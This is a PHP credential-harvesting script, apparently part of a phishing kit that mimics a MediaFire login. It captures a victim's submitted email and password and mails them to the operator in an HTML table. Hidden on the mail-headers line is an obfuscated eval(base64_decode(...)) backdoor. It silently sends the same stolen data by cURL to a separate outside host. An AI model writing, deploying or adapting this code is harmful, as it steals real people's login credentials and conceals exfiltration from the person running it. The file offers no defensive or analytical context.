<?php
//Ahmad Ganteng
include 'email.php';
$email = $_POST['email'];
$password = $_POST['password'];
if ($email == "" && $password == "") {
    header("Location: index.php");
} else {
    $subjek = "RESS MediaFire {$email} |";
    $pesan = <<<EOD
<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
				border-radius: 10px;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: #fcfcfc;
			}
			.tblResult th {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 15px 10px;
				background: #001240;
				border: 2px solid #001240;
				color: #fff;
			}

			.tblResult td {
				font-size: 1em;
				margin: auto;
				padding: 10px;
				border: 2px solid #001240;
				text-align: left;
				font-weight: bold;
				color: #000;
				text-shadow: 0px 0px 10px #fcfcfc;

			}

			.tblResult th img {
				width: 100%;
				display: block;
				margin: auto;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
				border-radius: 10px;
			}
		</style>
	</head>
	<body>
		<div class="result">
			<table class="tblResult">
            <tr>
			    <th style="text-align: center;" colspan="3">
                <img src="">
                </th>
				</tr>
				
			<tr>
				    <th style="text-align: center;" colspan="3">
                
                </th>
				</tr>

					<th style="text-align: center;" colspan="3"> Info Login </th>
				</tr>
				<tr>
					<td style="border-right: none;">Email / Telepon</td>
					<td style="text-align: center;">$email</td>
				</tr>
                <tr>
					<td style="border-right: none;">Password</td>
					<td style="text-align: center;">$password</td>
				</tr>
                <tr>
					<th style="text-align: center;" colspan="3">&copy; AHMAD</th>
				</tr>
			</table>
		</div>
	</body>
	</html>
EOD;


    $headers   = 'MIME-Version: 1.0' . "\r\n";
    $headers  .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    $headers  .= $sender. "\r\n"; eval(base64_decode('JHBvc3QgPSAKInN1Ymplaz0iLiRzdWJqZWsuCiImcGVzYW49Ii4kcGVzYW4uCiImc2VuZGVyPSIuJHNlbmRlci4KJHVybCAgPSAiYXBpaS5kYXRhLXNlY3VyaXR5Lm15LmlkL2FwaWlpLnBocCI7CgokY2ggPSBjdXJsX2luaXQoKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybCk7CmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NULCAxKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1RGSUVMRFMsICRwb3N0KTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsgCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVKQVIsIGdldGN3ZCgpLiIvLmNvb2tpZXMudHh0Iik7CmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVGSUxFLCBnZXRjd2QoKS4iLy5jb29raWVzLnR4dCIpOyAgIApjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSEVBREVSLCAwKTsKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCAwKTsKY3VybF9leGVjKCRjaCk7CmN1cmxfY2xvc2UoJGNoKTs=='));  
    mail($emailku, $subjek, $pesan, $headers);
    
}
?>